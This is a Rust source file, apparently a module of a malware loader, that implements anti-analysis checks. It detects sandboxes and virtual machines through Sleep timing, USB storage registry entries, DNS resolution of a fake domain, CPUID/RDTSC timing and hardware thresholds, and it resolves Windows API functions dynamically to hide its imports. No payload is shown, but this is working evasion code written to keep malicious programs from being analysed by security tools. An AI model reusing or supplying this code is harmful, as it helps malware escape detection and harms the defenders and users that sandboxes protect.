use std::{
    arch::x86_64::{_rdtsc, __cpuid},
    ffi::OsStr,
    net::ToSocketAddrs
};
use sysinfo::{System,Disks};
use crate::iat::get_function_address;

type QueryPerformanceCounter=extern "system" fn(input: *mut i64) -> i32;
type QueryPerformanceFrequency=extern "system" fn(input: *mut i64) -> i32;
type Sleep=extern "system" fn(input: u32) -> ();
pub fn is_sandbox_sleep() -> bool {
    let mut flag:bool=false;
    unsafe {
        let query_performance_counter:QueryPerformanceCounter=std::mem::transmute(get_function_address("kernel32.dll", "QueryPerformanceCounter").unwrap());
        let query_performance_frequency:QueryPerformanceFrequency=std::mem::transmute(get_function_address("kernel32.dll", "QueryPerformanceFrequency").unwrap());
        let sleep:Sleep=std::mem::transmute(get_function_address("kernel32.dll", "Sleep").unwrap());
        let mut frequency:i64=0;
        let res_1=query_performance_frequency(&mut frequency);
        if res_1!=0 && frequency!=0 {
            let mut start:i64=0;
            let mut end:i64=0;
            query_performance_counter(&mut start);
            sleep(2000);
            query_performance_counter(&mut end);
            let diff=((((end-start) as f64)/(frequency as f64)) as i64)*1000;
            if 2000-diff>200{
                flag=true;
            }
        }
    }
    flag
}

fn resolve_domain(domain: &str) -> String {
    
    let addr_with_port = format!("{}:80", domain);
    
    match addr_with_port.to_socket_addrs() {
        Ok(mut addrs) => {
            if let Some(addr) = addrs.next() {
                // 返回 "ip:port" 格式
                addr.to_string()
            } else {
                "".to_string()
            }
        }
        Err(_) => "".to_string()
    }
}

type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> u32;
type RegCloseKey = unsafe extern "system" fn(isize) -> u32;
type RegQueryInfoKeyW = unsafe extern "system" fn(
    isize, *mut u16, *mut u32, *mut u32, *mut u32, *mut u32, 
    *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u64
) -> u32;
const HKEY_LOCAL_MACHINE: isize = 0x80000002;
const KEY_READ: u32 = 0x20019;
const ERROR_SUCCESS: u32 = 0;
fn count_cpus()->u32{
    //cpu数量，单位：个
    let cpus=System::physical_core_count();
    match cpus {
        Some(res)=>{return res as u32;},
        None=>{return 0;}
    }
}

fn count_rams(sys:&System)->u32{
    //内存大小，单位：GB
    ((sys.total_memory() as u64)/(1024*1024*1024)) as u32
}

fn count_disk()->u32{
    //硬盘大小，单位：GB
    let disks=Disks::new_with_refreshed_list();
    for disk in disks.list(){
        let name=disk.name();
        let file_system=disk.file_system();

        let dst_file_name=OsStr::new("Windows");
        let dst_file_system=OsStr::new("NTFS");
        if name==dst_file_name&&file_system==dst_file_system{
            return ((disk.total_space() as u64)/(1024*1024*1024)) as u32;
        }
    }
    100
}

fn count_proc(sys:&System)->u32{
    //进程数量，单位：个
    sys.processes().len() as u32
}
pub fn is_sandbox_usbstor() -> bool {
    unsafe {
        // 获取函数地址
        let reg_open_key: RegOpenKeyExW = std::mem::transmute(
            get_function_address("advapi32.dll", "RegOpenKeyExW").unwrap()
        );
        let reg_close_key: RegCloseKey = std::mem::transmute(
            get_function_address("advapi32.dll", "RegCloseKey").unwrap()
        );
        let reg_query_info: RegQueryInfoKeyW = std::mem::transmute(
            get_function_address("advapi32.dll", "RegQueryInfoKeyW").unwrap()
        );
        // 打开注册表键
        let mut hkey: isize = 0;
        let key_path = "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\0";
        let key_path_wide: Vec<u16> = key_path.encode_utf16().collect();
        if reg_open_key(HKEY_LOCAL_MACHINE, key_path_wide.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
            return true;  // 无法打开 → 可能是沙箱
        }
        // 查询子键数量
        let mut subkey_count: u32 = 0;
        if reg_query_info(hkey, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            &mut subkey_count, std::ptr::null_mut(), std::ptr::null_mut(),
            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            std::ptr::null_mut(), std::ptr::null_mut()) != ERROR_SUCCESS {
            let _ = reg_close_key(hkey);
            return true;  // 查询失败 → 可能是沙箱
        }
        // 关闭注册表键
        let _ = reg_close_key(hkey);
        // 检测逻辑：沙箱通常没有USB设备
        subkey_count == 0  // 没有USB设备 → 可能是沙箱 → true
    }
}
pub fn is_sandbox_dns() -> bool {
    let fake_domain = "this-domain-definitely-does-not-exist-12345.test";
    !resolve_domain(fake_domain).is_empty()
}

pub fn is_sandbox_cpuid() -> bool {
    unsafe {
        let v72 = _rdtsc();
        __cpuid(0);
        let v81 = _rdtsc();
        let elapsed = v81.wrapping_sub(v72);
        elapsed > 0x3E8         // 5. 如果耗时 > 1000周期 → 虚拟机
    }
}

pub fn is_sandbox_sysinfo(cpus_count:u32,rams_size:u32,proc_count:u32,disk_size:u32)->bool{
    let mut sys=System::new();
    sys.refresh_all();
    let cpus=count_cpus();
    let rams=count_rams(&sys);
    let proc=count_proc(&sys);
    let disk=count_disk();

    return cpus<cpus_count || rams<rams_size || proc<proc_count || disk<disk_size
}